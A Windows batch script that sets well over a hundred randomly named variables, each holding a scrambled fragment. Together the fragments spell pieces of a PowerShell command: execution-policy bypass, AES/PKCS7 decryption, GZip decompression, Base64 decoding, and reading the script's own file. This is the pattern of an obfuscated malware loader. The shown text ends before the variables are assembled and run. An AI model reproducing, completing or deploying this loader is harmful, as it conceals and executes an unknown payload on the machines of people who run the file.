@echo off
set "nKOYlbkpGc=BC;$"
set "vcPlNucMlj=ptog"
set "wAFFHqDBYB=)($w"
set "FmWnItXJDo=File"
set "oEOTtjIMHe=ScwT"
set "aeNDVYDPHb=[IO."
set "EoOYhDWZcK=;$FI"
set "jcORdssKDb=vj0m"
set "YcOHcjwBjY=ay()"
set "BydkIyXcYO=gyop"
set "QVSwpXORfY= = N"
set "gugryBQips=F'[-"
set "iNTzOTBAwo=);$N"
set "BjFSBGdKoH=Comp"
set "qqwmRoFhVN=ScwT"
set "OeUlqVusBM=$wnE"
set "ZlmuRHlDVN=($CO"
set "pTWEVsdDKX=oryS"
set "jKNmMCbfcr=rofi"
set "enpgybnwZr=PKCS"
set "QnxMgDVlyU=raph"
set "xCJbQLLxvy=)) {"
set "PUjOVTLZCu=).Sp"
set "wEQWjmYldj=$wnE"
set "mtuDoSacVn=.Con"
set "YfhoMnOCBx=  $g"
set "PnaJmQdaZB=nEgB"
set "CyJsnKJpAF=pD.D"
set "qnBcaAKiEj=[Env"
set "FIQRBOziWl=ose("
set "CeWwOFkITU=Star"
set "vmZPZWgSFf=[Sys"
set "zrqkbCYzZR=6] -"
set "siVqfAqawA=eQz."
set "SImFppTfMm=B = "
set "PGIpHEjEpr='[-1"
set "NWdSRGFDcH=am;$"
set "ibrzaPmzeh=gB);"
set "IzZrTttPPS=ing("
set "mJKuJmYTRu=vert"
set "oLZjOpoYHK=($CO"
set "ihNeZjooEg=ss -"
set "RHAioXNOds=stem"
set "UhqzJJPMLF=Conv"
set "VRlfeaQXWn=]::C"
set "pcZyujQphy=.GZi"
set "NguRiXzcbr=;$Bm"
set "vVUzHUozQS=New-"
set "TAwADIsvGK=$OAm"
set "gleTwdRlcF=UGTu"
set "cyfNdOifRG=so, "
set "iCmQckRyNf=B = "
set "hvfokYyoWu=tS46"
set "pdlsyHeQlM=ZYYc"
set "zRsiSGlMBF=trea"
set "iPvRbMbGmQ=ach "
set "kpaOogYRwQ=ddin"
set "LIJBvTfVWf=saBm"
set "vXnJfGfTVu=join"
set "cJFJRIiIUu=pStr"
set "QtmyTlujtx=);$z"
set "YyvBGucfKW=.Len"
set "iBKCHJjjSr=iwf."
set "KGOjZlhdUp=FILs"
set "QLjdfzbSZT=comm"
set "wRaSypkvCR=S46e"
set "ABTdwyBvfl=ring"
set "dciOVTAbQW=rity"
set "kiKtQkDrCb=wT.I"
set "dJFlMTNpNC=ct S"
set "OoptVqrgia=th('"
set "BqzkQtRuUM=eam("
set "raqJAXiRTF=[Sys"
set "UumRpzhsXn=y.Ci"
set "ymySGqAfXe= = ["
set "UNBQMAGKZM=grap"
set "HhjVWsrkcr=v4Ir"
set "hFdiVMpINO=.Com"
set "UKIVmTXErf=-ep "
set "MlYTPFAABT=se()"
set "yuLaIgFEYg=NScw"
set "jwTBtiKPah=('l0"
set "xsyWVHMWpF=k; }"
set "IEWKVHLaYF=B, 0"
set "ztyeMdefUr== [S"
set "gspXYEzdMY=n ''"
set "IbYvQMiUuC=U.En"
set "lXGQFzKTbS=.Dis"
set "rLEGLmEoCj= = $"
set "llsqrhEOQy=onve"
set "tyKhedQJWm=null"
set "NyVoSLsQbF= [Sy"
set "ZBwzmsQyrG=::De"
set "wuvNauHaRP=7;$N"
set "JgjnoodEVV== $N"
set "siFFImoill=d;$N"
set "LWTYzUcgsM=e]::"
set "DjUhIEjeps=1..-"
set "qKRuCJLNQE=();$"
set "pwZrSxQqTY=ment"
set "WzZJmOlpCq=ispo"
set "TfzButWnAr=ew-O"
set "avTzMkeuLy=yste"
set "nqEWsfRSAO=T.Pa"
set "PSVeWfqMkS=ress"
set "QacsXqCYaV='txe"
set "kHHPkfxmXc=]::("
set "jjOGbILaCJ=ose("
set "vEoWlwjyCz=..-1"
set "aekOYxUELr=daeR"
set "CSUIlApWzM=ode]"
set "dnsHyLzkpv=nEgB"
set "iHyEeSJpUq=o = "
set "dhvuAHvASk=.Dis"
set "SzBuxBfmoV=New-"
set "MQcxEMLEJF=rt]:"
set "VEfsDyyTAr==');"
set "xUZkViccnq===')"
set "yKRaOYpmsn=oin "
set "azqVaqAPDI=Disp"
set "AVmeeVqIYV=('%~f0'"
set "YRPxUGsOyI=TllA"
set "NReRaQTRba=sGUc"
set "WufDpKiYXC=oArr"
set "EbCgOkwLvD=y]::"
set "kamHiJeFrZ=pose"
set "zUuGuqocOg=Fina"
set "jEqfXygDMA='gni"
set "eiUwdLrNBy=raph"
set "svvuyvYpjN=Comp"
set "RmmSzDdfaD=);$O"
set "bZrARxvvln=Stre"
set "xYefSRkoIv=Disp"
set "iCutfcieqJ=ewLi"
set "dcndUTSPZL=join"
set "sYEscudWeK=bjec"
set "VivIpszLhx=nage"
set "nmSfSVuMPZ=ziGp"
set "OmxLLUKyHh=[Sys"
set "BUiNeoRLeY=D = "
set "YLiAHcvIXw=esMa"
set "jrORSjuWLC=tem."
set "YZQFDgmbJh=ck($"
set "lOYnhCYvtT=-joi"
set "FamPWfabSS=iwf "
set "yaMRpoDZYI=ecry"
set "MmqxxPhlHW=Obje"
set "nOjDZEKnAU=TllA"
set "HQpfYYXbAI=wnEg"
set "KaxWbiFajK=ScwT"
set "TzCgCMIyjd=gMod"
set "QjhTSmKgSp=Lso."
set "ZaZqTYYGIP=esFX"
set "TkhtCcCRBB=y.Pa"
set "kbCoTlTssM=hy.A"
set "RrsHyrPteL=mory"
set "koqVQwIknP=.Cre"
set "iBukQiMePy=wf.T"
set "KupGigMnue=fore"
set "zbacKGHiMa='[-1"
set "LhkVtQfCSu=e = "
set "GSqfNqgbFN=();$"
set "pccgMUdevy=oL'["
set "ABFAulqAuS= '')"
set "FxOXctsHOw=and "
set "UuHlTfYSYQ=AmBn"
set "JUObsclLgc=ress"
set "KScMGKQSsS=wnEg"
set "IaJrxbTqNn= New"
set "DSWRdRzbhY='')("
set "OQzyzEsGAK=Syst"
set "ZHKqzeYnTT=$FIL"
